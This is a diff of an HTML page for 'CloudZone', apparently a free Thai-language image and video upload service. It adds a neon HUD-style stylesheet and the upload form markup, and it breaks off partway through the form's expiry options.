+      .card{padding:24px 20px}
+    }
+    /* Desktop (≥ 1024px) */
+    @media(min-width:1024px){
+      .wrap{padding:0 24px 100px}
+      header{padding:48px 0 36px}
+      .card{padding:36px 40px}
+      .card-title{font-size:1.2rem}
+      .dropzone{padding:56px 32px}
+      .dz-icon svg{width:56px;height:56px}
+      .dz-text{font-size:1.05rem}
+      .btn-upload{padding:18px;font-size:1rem}
+      .hist-thumb{width:84px;height:84px}
+    }
+
+    /* ── KEYFRAMES ── */
+    @keyframes spin{to{transform:rotate(360deg)}}
+    @keyframes pulse-glow{0%,100%{opacity:.6;box-shadow:0 0 8px var(--glow)}50%{opacity:1;box-shadow:0 0 22px var(--glow),0 0 40px rgba(0,212,255,.2)}}
+    @keyframes scan-line{0%{top:-10%}100%{top:110%}}
+    @keyframes glitch{0%,100%{transform:none;filter:none}92%{transform:none;filter:none}93%{transform:translate(-2px,0) skewX(-2deg);filter:hue-rotate(90deg)}95%{transform:translate(2px,0) skewX(2deg);filter:hue-rotate(-60deg)}97%{transform:none;filter:none}}
+    @keyframes blink-cursor{0%,100%{opacity:1}50%{opacity:0}}
+    @keyframes border-flow{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+    @keyframes slide-in-right{from{transform:translateX(20px);opacity:0}to{transform:none;opacity:1}}
+    @keyframes neon-flicker{0%,19%,21%,100%{opacity:1}20%{opacity:.4}}
+
+    /* ── HEADER ── */
+    header{
+      padding:40px 0 32px;
+      display:flex;align-items:center;justify-content:space-between;
+      position:relative;
+    }
+    header::after{
+      content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
+      background:linear-gradient(90deg,transparent,var(--accent),var(--accent2),transparent);
+      opacity:.4;
+    }
+    .logo{display:flex;align-items:center;gap:14px}
+    .logo-icon{
+      width:44px;height:44px;
+      background:linear-gradient(135deg,rgba(0,212,255,.2),rgba(0,100,180,.3));
+      border:1px solid var(--accent);
+      clip-path:polygon(8px 0%,100% 0%,100% calc(100% - 8px),calc(100% - 8px) 100%,0% 100%,0% 8px);
+      display:flex;align-items:center;justify-content:center;
+      box-shadow:0 0 18px var(--glow),inset 0 0 12px rgba(0,212,255,.1);
+      animation:pulse-glow 3s ease-in-out infinite;
+      padding:2px;overflow:hidden;
+    }
+    .logo-icon img{width:32px;height:32px;object-fit:contain;
+      clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px);}
+    .logo-text{
+      font-family:var(--hud);
+      font-size:1.3rem;font-weight:900;
+      letter-spacing:2px;
+      color:#fff;
+      text-shadow:0 0 12px var(--accent),0 0 24px rgba(0,212,255,.4);
+      animation:glitch 8s ease-in-out infinite;
+    }
+    .logo-text span{color:var(--accent);text-shadow:0 0 14px var(--accent)}
+    .badge{
+      font-family:var(--hud);font-size:.6rem;letter-spacing:2px;text-transform:uppercase;
+      color:var(--accent);
+      border:1px solid var(--accent);
+      padding:4px 12px;
+      clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px);
+      background:rgba(0,212,255,.08);
+      box-shadow:0 0 10px rgba(0,212,255,.2);
+      position:relative;overflow:hidden;
+    }
+    .badge::before{
+      content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;
+      background:linear-gradient(90deg,transparent,rgba(0,212,255,.3),transparent);
+      animation:scan-line 2.5s linear infinite;
+    }
+
+    /* ── HUD CARD ── */
+    .card{
+      background:linear-gradient(135deg,rgba(0,22,40,.95),rgba(0,14,28,.98));
+      border:1px solid rgba(0,150,200,.35);
+      border-radius:0;
+      padding:32px;
+      margin-bottom:20px;
+      position:relative;
+      clip-path:polygon(16px 0%,100% 0%,100% calc(100% - 16px),calc(100% - 16px) 100%,0% 100%,0% 16px);
+      transition:border-color .3s,box-shadow .3s;
+    }
+    /* Corner brackets */
+    .card::before,.card::after{
+      content:'';position:absolute;width:20px;height:20px;
+      border-color:var(--accent);border-style:solid;
+      box-shadow:0 0 8px var(--glow);
+    }
+    .card::before{top:0;left:0;border-width:2px 0 0 2px}
+    .card::after{bottom:0;right:0;border-width:0 2px 2px 0}
+    .card:hover{
+      border-color:rgba(0,212,255,.6);
+      box-shadow:0 0 30px rgba(0,212,255,.1),inset 0 0 30px rgba(0,212,255,.03);
+    }
+    /* Top decorative line */
+    .card-header-line{
+      position:absolute;top:0;left:16px;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      opacity:.7;
+    }
+    .card-title{
+      font-family:var(--hud);font-size:1.1rem;font-weight:700;
+      margin-bottom:4px;color:#fff;letter-spacing:2px;
+      text-shadow:0 0 10px rgba(0,212,255,.5);
+    }
+    .card-title::before{content:'// ';color:var(--accent);opacity:.7}
+    .card-sub{
+      font-family:var(--mono);font-size:.8rem;color:var(--muted);
+      margin-bottom:28px;letter-spacing:.5px;
+    }
+
+    /* ── DROPZONE ── */
+    .dropzone{
+      border:1px solid rgba(0,150,200,.4);
+      border-radius:0;
+      padding:48px 20px;
+      text-align:center;
+      cursor:pointer;
+      transition:all .3s ease;
+      background:rgba(0,212,255,.02);
+      position:relative;overflow:hidden;
+      clip-path:polygon(10px 0%,100% 0%,100% calc(100% - 10px),calc(100% - 10px) 100%,0% 100%,0% 10px);
+    }
+    .dropzone::before{
+      content:'';position:absolute;inset:0;
+      background:radial-gradient(ellipse at center,rgba(0,212,255,.06) 0%,transparent 70%);
+      opacity:0;transition:opacity .4s;
+    }
+    /* Animated corner brackets for dropzone */
+    .dropzone::after{
+      content:'';position:absolute;
+      top:8px;right:8px;width:16px;height:16px;
+      border-top:2px solid var(--accent);border-right:2px solid var(--accent);
+      opacity:.6;
+    }
+    .dz-corner-bl{
+      position:absolute;bottom:8px;left:8px;width:16px;height:16px;
+      border-bottom:2px solid var(--accent);border-left:2px solid var(--accent);
+      opacity:.6;pointer-events:none;
+    }
+    .dropzone:hover::before,.dropzone.drag-over::before{opacity:1}
+    .dropzone:hover,.dropzone.drag-over{
+      border-color:var(--accent);
+      background:rgba(0,212,255,.05);
+      box-shadow:0 0 25px rgba(0,212,255,.15),inset 0 0 25px rgba(0,212,255,.04);
+    }
+    .dropzone.drag-over{transform:scale(1.008)}
+    .dz-icon{display:flex;justify-content:center;margin-bottom:14px;color:var(--accent)}
+    .dz-icon svg{width:48px;height:48px}
+    .dz-text{
+      font-family:var(--hud);font-size:.95rem;font-weight:600;
+      color:var(--text);margin-bottom:6px;letter-spacing:1.5px;
+    }
+    .dz-sub{font-family:var(--mono);font-size:.78rem;color:var(--muted);letter-spacing:.5px}
+    .dz-types{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:18px}
+    .dz-tag{
+      font-family:var(--hud);font-size:.6rem;
+      background:rgba(0,212,255,.06);
+      color:var(--accent);
+      border:1px solid rgba(0,212,255,.25);
+      padding:3px 10px;letter-spacing:1.5px;
+      clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px);
+    }
+    #fileInput{display:none}
+
+    /* ── PREVIEW ── */
+    #previewArea{
+      display:none;margin-top:20px;overflow:hidden;
+      border:1px solid rgba(0,150,200,.4);
+      background:var(--surface);
+      clip-path:polygon(10px 0%,100% 0%,100% calc(100% - 10px),calc(100% - 10px) 100%,0% 100%,0% 10px);
+    }
+    #previewArea img,#previewArea video{width:100%;max-height:320px;object-fit:contain;display:block}
+    .preview-info{
+      padding:10px 16px;display:flex;align-items:center;justify-content:space-between;
+      border-top:1px solid rgba(0,150,200,.25);gap:10px;
+      background:rgba(0,20,40,.8);
+    }
+    .preview-name{font-family:var(--mono);font-size:.78rem;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1}
+    .preview-size{font-family:var(--mono);font-size:.75rem;color:var(--muted);white-space:nowrap}
+    .btn-clear{
+      background:rgba(255,51,85,.08);border:1px solid rgba(255,51,85,.3);
+      color:var(--red);padding:5px 12px;font-size:.75rem;cursor:pointer;
+      font-family:var(--hud);letter-spacing:1px;
+      transition:all .2s;display:flex;align-items:center;gap:5px;white-space:nowrap;
+      clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px);
+    }
+    .btn-clear svg{width:13px;height:13px}
+    .btn-clear:hover{background:rgba(255,51,85,.18);box-shadow:0 0 12px rgba(255,51,85,.3)}
+
+    /* ── SETTINGS ── */
+    .settings-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:20px}
+    @media(max-width:520px){.settings-grid{grid-template-columns:1fr}}
+    .field label{
+      display:flex;align-items:center;gap:7px;
+      font-family:var(--hud);font-size:.62rem;font-weight:600;
+      color:var(--accent);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px;
+    }
+    .field label svg{width:14px;height:14px;flex-shrink:0}
+    .field select{
+      width:100%;
+      background:rgba(0,20,40,.9);
+      border:1px solid rgba(0,150,200,.35);
+      color:var(--text);
+      font-family:var(--mono);font-size:.88rem;
+      padding:11px 36px 11px 14px;
+      outline:none;cursor:pointer;
+      transition:border-color .2s,box-shadow .2s;
+      appearance:none;-webkit-appearance:none;
+      background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='7'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%2300d4ff' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+      background-repeat:no-repeat;background-position:right 14px center;
+      clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px);
+    }
+    .field select:focus{
+      border-color:var(--accent);
+      box-shadow:0 0 0 2px rgba(0,212,255,.15),0 0 15px rgba(0,212,255,.1);
+    }
+    .field select option{background:#001628;color:var(--text)}
+
+    /* ── UPLOAD BUTTON ── */
+    .btn-upload{
+      width:100%;margin-top:24px;
+      background:linear-gradient(90deg,#003a5c 0%,#005580 40%,#0088aa 70%,#00d4ff 100%);
+      color:#fff;border:none;
+      padding:16px;
+      font-family:var(--hud);font-size:.95rem;font-weight:700;letter-spacing:2px;
+      cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;
+      transition:all .3s ease;
+      position:relative;overflow:hidden;
+      box-shadow:0 0 24px rgba(0,212,255,.3),inset 0 1px 0 rgba(255,255,255,.1);
+      clip-path:polygon(12px 0%,100% 0%,100% calc(100% - 12px),calc(100% - 12px) 100%,0% 100%,0% 12px);
+      text-transform:uppercase;
+    }
+    .btn-upload::before{
+      content:'';position:absolute;inset:0;
+      background:linear-gradient(90deg,transparent 0%,rgba(255,255,255,.12) 50%,transparent 100%);
+      transform:translateX(-100%);transition:transform .5s ease;
+    }
+    .btn-upload:hover::before{transform:translateX(100%)}
+    .btn-upload:hover{
+      box-shadow:0 0 40px rgba(0,212,255,.5),0 0 80px rgba(0,212,255,.2);
+      transform:translateY(-1px);
+    }
+    .btn-upload:active{transform:translateY(0);box-shadow:0 0 15px rgba(0,212,255,.3)}
+    .btn-upload:disabled{opacity:.4;cursor:not-allowed;transform:none;box-shadow:none}
+
+    /* ── PROGRESS ── */
+    #progressWrap{display:none;margin-top:20px}
+    .progress-label{
+      font-family:var(--mono);font-size:.78rem;color:var(--muted);
+      margin-bottom:8px;display:flex;justify-content:space-between;letter-spacing:.5px;
+    }
+    .progress-bar-bg{
+      background:rgba(0,20,40,.8);height:8px;overflow:hidden;
+      border:1px solid rgba(0,150,200,.3);
+      clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px);
+    }
+    .progress-bar-fill{
+      height:100%;
+      background:linear-gradient(90deg,#003a80,#0066cc,#00aaff,#00d4ff,#60efff);
+      background-size:200% 100%;
+      animation:border-flow 1.5s linear infinite;
+      width:0%;transition:width .4s ease;
+      box-shadow:0 0 12px var(--accent),0 0 24px rgba(0,212,255,.4);
+    }
+
+    /* ── RESULT CARD ── */
+    #resultCard{
+      display:none;
+      background:linear-gradient(135deg,rgba(0,255,200,.04),rgba(0,212,255,.06));
+      border:1px solid rgba(0,255,180,.35);
+      padding:24px;margin-bottom:20px;
+      position:relative;
+      clip-path:polygon(12px 0%,100% 0%,100% calc(100% - 12px),calc(100% - 12px) 100%,0% 100%,0% 12px);
+      box-shadow:0 0 20px rgba(0,255,200,.08);
+    }
+    #resultCard::before{
+      content:'';position:absolute;top:0;left:12px;right:0;height:2px;
+      background:linear-gradient(90deg,var(--green),var(--accent),transparent);
+    }
+    .result-header{display:flex;align-items:center;gap:12px;margin-bottom:16px}
+    .result-header svg{width:24px;height:24px;color:var(--green);flex-shrink:0;filter:drop-shadow(0 0 6px var(--green))}
+    .result-title{font-family:var(--hud);font-size:.95rem;font-weight:700;color:var(--green);letter-spacing:1.5px;text-shadow:0 0 10px rgba(0,255,200,.5)}
+    .result-sub{font-family:var(--mono);font-size:.78rem;color:var(--muted);letter-spacing:.5px;margin-top:2px}
+    .url-row{display:flex;gap:10px;margin-bottom:10px}
+    .url-input{
+      flex:1;background:rgba(0,10,20,.9);
+      border:1px solid rgba(0,150,200,.3);
+      color:var(--accent);
+      font-family:var(--mono);font-size:.75rem;
+      padding:10px 14px;outline:none;
+      clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px);
+    }
+    .btn-copy{
+      background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.3);
+      color:var(--accent);padding:10px 14px;font-size:.8rem;cursor:pointer;
+      font-family:var(--hud);letter-spacing:1px;white-space:nowrap;
+      transition:all .2s;display:flex;align-items:center;gap:6px;
+      clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px);
+    }
+    .btn-copy svg{width:15px;height:15px;flex-shrink:0}
+    .btn-copy:hover{background:rgba(0,212,255,.18);box-shadow:0 0 15px rgba(0,212,255,.3)}
+    .btn-copy.copied{color:var(--green);border-color:rgba(0,255,200,.4);box-shadow:0 0 12px rgba(0,255,200,.2)}
+
+    /* ── HISTORY ── */
+    #historyCard{display:none}
+    .history-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+    .history-title{
+      display:flex;align-items:center;gap:8px;
+      font-family:var(--hud);font-size:.65rem;font-weight:600;
+      color:var(--accent);text-transform:uppercase;letter-spacing:1.5px;
+    }
+    .history-title svg{width:14px;height:14px}
+    .history-count{
+      font-family:var(--hud);font-size:.6rem;color:var(--accent);
+      background:rgba(0,212,255,.1);
+      border:1px solid rgba(0,212,255,.25);
+      padding:3px 10px;letter-spacing:1px;
+      clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px);
+    }
+    #historyList{display:flex;flex-direction:column;gap:10px}
+
+    .hist-item{
+      background:rgba(0,18,35,.95);
+      border:1px solid rgba(0,120,180,.25);
+      padding:12px 16px;
+      display:flex;align-items:center;gap:14px;
+      transition:border-color .2s,box-shadow .2s,opacity .25s,transform .25s;
+      position:relative;
+      clip-path:polygon(8px 0%,100% 0%,100% calc(100% - 8px),calc(100% - 8px) 100%,0% 100%,0% 8px);
+    }
+    .hist-item::before{
+      content:'';position:absolute;left:0;top:0;bottom:0;width:2px;
+      background:linear-gradient(180deg,transparent,var(--accent),transparent);
+      opacity:0;transition:opacity .3s;
+    }
+    .hist-item:hover{
+      border-color:rgba(0,212,255,.45);
+      box-shadow:0 0 18px rgba(0,212,255,.08);
+    }
+    .hist-item:hover::before{opacity:.6}
+    .hist-thumb{
+      width:72px;height:72px;
+      background:rgba(0,20,40,.8);flex-shrink:0;
+      display:flex;align-items:center;justify-content:center;overflow:hidden;
+      border:1px solid rgba(0,120,180,.3);
+      clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px);
+    }
+    .hist-thumb svg{width:28px;height:28px;color:var(--muted)}
+    .hist-thumb img,.hist-thumb video{width:100%;height:100%;object-fit:cover;display:block}
+    .hist-info{flex:1;min-width:0}
+    .hist-name{font-family:var(--mono);font-size:.82rem;color:var(--text);font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .hist-meta{font-family:var(--mono);font-size:.72rem;color:var(--muted);margin-top:3px;letter-spacing:.3px}
+    .hist-actions{display:flex;gap:4px;flex-shrink:0}
+    .hist-btn{
+      background:none;border:1px solid transparent;cursor:pointer;
+      padding:7px;transition:all .2s;display:flex;align-items:center;color:var(--muted);
+      clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px);
+    }
+    .hist-btn svg{width:15px;height:15px}
+    .hist-btn.copy-btn:hover{color:var(--accent);background:rgba(0,212,255,.1);border-color:rgba(0,212,255,.25);box-shadow:0 0 8px rgba(0,212,255,.2)}
+    .hist-btn.del-btn:hover{color:var(--red);background:rgba(255,51,85,.1);border-color:rgba(255,51,85,.25);box-shadow:0 0 8px rgba(255,51,85,.2)}
+    .hist-btn.del-btn.loading{opacity:.5;pointer-events:none}
+
+    /* ── ERROR BOX ── */
+    #errorBox{
+      display:none;
+      background:rgba(255,51,85,.05);
+      border:1px solid rgba(255,51,85,.3);
+      padding:14px 18px;color:var(--red);font-family:var(--mono);font-size:.85rem;
+      margin-top:16px;align-items:center;gap:10px;
+      clip-path:polygon(8px 0%,100% 0%,100% calc(100% - 8px),calc(100% - 8px) 100%,0% 100%,0% 8px);
+      box-shadow:0 0 15px rgba(255,51,85,.1);
+    }
+    #errorBox svg{width:18px;height:18px;flex-shrink:0}
+
+    /* ── DEBUG PANEL ── */
+    #debugPanel{display:none;margin-top:14px;background:rgba(0,6,15,.95);border:1px solid rgba(0,80,140,.4);overflow:hidden;
+      clip-path:polygon(8px 0%,100% 0%,100% calc(100% - 8px),calc(100% - 8px) 100%,0% 100%,0% 8px);}
+    .dbg-header{
+      background:rgba(0,100,160,.15);
+      border-bottom:1px solid rgba(0,100,160,.3);
+      padding:10px 16px;display:flex;align-items:center;justify-content:space-between;
+    }
+    .dbg-title{font-family:var(--hud);font-size:.65rem;color:var(--accent);text-transform:uppercase;letter-spacing:1.5px;display:flex;align-items:center;gap:7px}
+    .dbg-title svg{width:14px;height:14px}
+    .dbg-close{background:none;border:none;color:var(--muted);cursor:pointer;padding:4px 8px;transition:color .2s;display:flex;align-items:center}
+    .dbg-close svg{width:14px;height:14px}
+    .dbg-close:hover{color:var(--red)}
+    .dbg-body{padding:14px 16px}
+    .dbg-row{display:flex;gap:10px;margin-bottom:10px;align-items:flex-start}
+    .dbg-lbl{font-family:var(--hud);font-size:.62rem;color:var(--accent);min-width:120px;padding-top:2px;text-transform:uppercase;letter-spacing:1px;flex-shrink:0}
+    .dbg-val{font-family:var(--mono);font-size:.78rem;color:#e2eaf4;word-break:break-all;line-height:1.5}
+    .dbg-val.ok{color:var(--green)} .dbg-val.err{color:var(--red)} .dbg-val.warn{color:var(--warn)}
+    .dbg-sep{border:none;border-top:1px solid rgba(0,80,140,.3);margin:10px 0}
+    .dbg-raw{
+      font-family:var(--mono);font-size:.75rem;color:#94a3b8;
+      background:rgba(0,4,10,.9);padding:10px 12px;margin-top:6px;
+      white-space:pre-wrap;word-break:break-all;max-height:160px;overflow-y:auto;
+      line-height:1.5;border:1px solid rgba(0,80,140,.3);
+      clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px);
+    }
+    .dbg-copy{
+      margin-top:8px;background:none;border:1px solid rgba(0,80,140,.4);
+      color:var(--accent);padding:5px 12px;font-family:var(--hud);font-size:.62rem;
+      letter-spacing:1px;cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:6px;
+      clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px);
+    }
+    .dbg-copy:hover{background:rgba(0,150,200,.15)}
+
+    /* ── FOOTER ── */
+    footer{
+      text-align:center;padding:40px 0 20px;
+      font-family:var(--mono);font-size:.75rem;color:var(--muted);letter-spacing:.5px;
+      position:relative;
+    }
+    footer::before{
+      content:'';position:absolute;top:0;left:20%;right:20%;height:1px;
+      background:linear-gradient(90deg,transparent,rgba(0,212,255,.3),transparent);
+    }
+    footer span{color:var(--accent);text-shadow:0 0 8px rgba(0,212,255,.5)}
+
+    /* ── MULTI-FILE LIST ── */
+    .mf-item{
+      display:flex;align-items:center;gap:10px;
+      background:rgba(0,18,35,.9);
+      border:1px solid rgba(0,120,180,.25);
+      padding:9px 12px;
+      clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px);
+      transition:border-color .2s;
+    }
+    .mf-item.done{border-color:rgba(0,255,160,.3)}
+    .mf-item.fail{border-color:rgba(255,51,85,.3)}
+    .mf-thumb{
+      width:38px;height:38px;flex-shrink:0;
+      background:rgba(0,30,50,.8);
+      border:1px solid rgba(0,120,180,.2);
+      display:flex;align-items:center;justify-content:center;overflow:hidden;
+      clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px);
+    }
+    .mf-thumb img{width:100%;height:100%;object-fit:cover;display:block}
+    .mf-thumb svg{width:18px;height:18px;color:var(--muted)}
+    .mf-info{flex:1;min-width:0}
+    .mf-name{font-family:var(--mono);font-size:.78rem;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .mf-size{font-family:var(--mono);font-size:.7rem;color:var(--muted);margin-top:2px}
+    .mf-status{font-family:var(--mono);font-size:.7rem;margin-top:2px}
+    .mf-status.ok{color:var(--green)} .mf-status.err{color:var(--red)} .mf-status.wait{color:var(--muted)}
+    .mf-remove{background:none;border:none;cursor:pointer;padding:4px;color:var(--muted);display:flex;align-items:center;transition:color .2s;flex-shrink:0}
+    .mf-remove:hover{color:var(--red)}
+    .mf-remove svg{width:14px;height:14px}
+
+    /* ── SPINNER ── */
+    .spinner{
+      width:20px;height:20px;border-radius:50%;
+      border:2px solid rgba(0,212,255,.25);
+      border-top-color:var(--accent);
+      animation:spin .7s linear infinite;flex-shrink:0;
+      box-shadow:0 0 8px var(--glow);
+    }
+
+    /* ── SWEETALERT2 HUD THEME ── */
+    .swal2-popup{
+      background:rgba(0,16,30,.97) !important;
+      border:1px solid rgba(0,150,200,.4) !important;
+      border-radius:0 !important;
+      clip-path:polygon(12px 0%,100% 0%,100% calc(100% - 12px),calc(100% - 12px) 100%,0% 100%,0% 12px) !important;
+      font-family:var(--font) !important;
+      box-shadow:0 0 40px rgba(0,150,200,.15) !important;
+    }
+    .swal2-title{color:var(--text) !important;font-family:var(--hud) !important;letter-spacing:1px !important;font-size:1.1rem !important}
+    .swal2-html-container{color:var(--muted) !important;font-family:var(--mono) !important;font-size:.88rem !important}
+    .swal2-confirm{
+      background:linear-gradient(90deg,#003a5c,#0066aa) !important;
+      border:1px solid var(--accent) !important;
+      border-radius:0 !important;
+      font-family:var(--hud) !important;font-weight:600 !important;
+      letter-spacing:1px !important;box-shadow:0 0 12px rgba(0,212,255,.3) !important;
+      clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px) !important;
+    }
+    .swal2-cancel{
+      background:rgba(0,20,40,.8) !important;
+      color:var(--muted) !important;
+      border:1px solid rgba(0,80,120,.4) !important;
+      border-radius:0 !important;
+      font-family:var(--hud) !important;font-weight:600 !important;
+      letter-spacing:1px !important;box-shadow:none !important;
+      clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px) !important;
+    }
+    .swal2-cancel:hover{background:rgba(0,40,70,.8) !important;color:var(--text) !important}
+    .swal2-icon{border-color:var(--accent) !important;filter:drop-shadow(0 0 6px var(--accent)) !important}
+    .swal2-icon .swal2-icon-content{color:var(--accent) !important}
+    /* success — วงกลมสีเขียว เหลือแค่ติ๊กถูก */
+    .swal2-icon.swal2-success{border-color:var(--green) !important;background:transparent !important;box-shadow:0 0 18px rgba(0,255,160,.25) !important;filter:drop-shadow(0 0 8px var(--green)) !important}
+    .swal2-success-circular-line-left,
+    .swal2-success-circular-line-right,
+    .swal2-success-fix{display:none !important}
+    .swal2-success-ring{border-color:rgba(0,255,160,.2) !important}
+    .swal2-success-line-tip,
+    .swal2-success-line-long{background:var(--green) !important}
+
+    /* ── SCAN LINE OVERLAY ── */
+    .scan-fx{
+      position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,transparent,rgba(0,212,255,.6),transparent);
+      animation:scan-line 3s linear infinite;pointer-events:none;z-index:10;
+    }
+
+    /* ── STATUS INDICATOR ── */
+    .sys-status{
+      display:flex;align-items:center;gap:6px;
+      font-family:var(--hud);font-size:.6rem;letter-spacing:1.5px;
+      color:var(--green);text-transform:uppercase;
+    }
+    .sys-dot{
+      width:6px;height:6px;background:var(--green);
+      border-radius:50%;
+      box-shadow:0 0 6px var(--green);
+      animation:pulse-glow 1.8s ease-in-out infinite;
+    }
+  </style>
+
+  <script type="application/ld+json">
   {
     "@context": "https://schema.org",
     "@type": "WebApplication",
@@ -10,4 +636,702 @@
     "offers": { "@type": "Offer", "price": "0", "priceCurrency": "THB" },
     "author": { "@type": "Person", "name": "x2Snow" }
   }
-  </script></head><body><div class="wrap"><div style="position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden"><div style="position:absolute;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(0,212,255,.5),transparent);animation:scan-line 4s linear infinite;top:0"></div></div><header data-aos="fade-down" data-aos-duration="600"><div class="logo"><div class="logo-icon"><img src="https://cloudzone.xephex.xyz/uploads/file_000000003878720b88f8eeef98579f44_1d29fa.jpg" style="width:32px;height:32px;object-fit:contain;"></div><div><div class="logo-text">Cloud<span>Zone</span></div><div class="sys-status" style="margin-top:2px"><div class="sys-dot"></div>SYSTEM ONLINE</div></div></div><div style="display:flex;flex-direction:column;align-items:flex-end;gap:6px"><div class="badge">BETA</div><div style="font-family:var(--mono);font-size:.6rem;color:var(--muted);letter-spacing:.5px" id="sys-time">--:--:--</div></div></header><div class="card" data-aos="fade-up" data-aos-duration="600" data-aos-delay="100"><div class="card-header-line"></div><div class="card-title">ฝากรูปภาพ &amp; วิดีโอ</div><div class="card-sub">&gt; อัพโหลดไฟล์ไปเก็บบนเซิฟเวอร์ ได้ฟรี ไม่จำกัดจำนวน</div><div class="dropzone" id="dropzone"><div class="dz-corner-bl"></div><div class="dz-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg></div><div class="dz-text">ลากไฟล์มาวางที่นี่ หรือคลิกเพื่อเลือก</div><div class="dz-sub">รองรับรูปภาพและวิดีโอทุกประเภท · สูงสุด 5 ไฟล์</div><div class="dz-types"><span class="dz-tag">JPG</span><span class="dz-tag">PNG</span><span class="dz-tag">GIF</span><span class="dz-tag">WEBP</span><span class="dz-tag">MP4</span><span class="dz-tag">MOV</span><span class="dz-tag">WEBM</span><span class="dz-tag">PDF</span></div></div><input type="file" id="fileInput" accept="image/*,video/*,.pdf,.gif,.webp" multiple><div id="previewArea" style="display:none;margin-top:16px"><div id="multiFileList" style="display:flex;flex-direction:column;gap:8px"></div><div style="display:flex;align-items:center;justify-content:space-between;margin-top:10px;padding:8px 4px 0;border-top:1px solid rgba(0,150,200,.15)"><span style="font-family:var(--mono);font-size:.75rem;color:var(--muted)" id="fileCountLabel"></span><button class="btn-clear" id="clearBtn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>ล้างทั้งหมด</button></div></div><div class="settings-grid"><div class="field"><label><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 3 21 3 21 9"/><polyline points="9 21 3 21 3 15"/><line x1="21" y1="3" x2="14" y2="10"/><line x1="3" y1="21" x2="10" y2="14"/></svg>ปรับขนาดรูป</label><select id="resizeOpt"><option value="">ไม่ปรับขนาดรูปภาพของฉัน</option><option value="64">64x64 — อวาตาร์ / ไอคอน</option><option value="150">150x150 — ภาพตัวอย่างขนาดเล็ก</option><option value="320">320x240 — ขนาดสำหรับเว็บไซต์หรืออีเมล</option><option value="640">640x480 — รูปภาพขนาดเล็ก</option><option value="800">800x600 — รูปภาพขนาดกลาง</option><option value="1024">1024x768 — รูปภาพขนาดใหญ่</option><option value="1280">1280x720 — คุณภาพระดับ HD</option><option value="1920">1920x1080 — คุณภาพระดับ Full HD</option><option value="3840">3840x2160 — คุณภาพระดับ 4K</option></select></div><div class="field"><label><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>วันหมดอายุ</label><select id="expiryOpt"><option value="">ไม่มีวันหมดอายุ</option><option value="1h">ลบหลังจาก 1 ชั่วโมง</option><option value="3h">ลบหลังจาก 3 ชั่วโมง</option><option value="6h">ลบหลังจาก 6 ชั่วโมง</option><option value="12h">ลบหลังจาก 12 ชั่วโมง</option><option value="1d">ลบหลังจาก 1 วัน</option><option value="3d">ลบหลังจาก 3 วัน</option><option value="1w">ลบหลังจาก 1 สัปดาห์</option><option value="2w">ลบหลังจาก 2 สัปดาห์</option><option 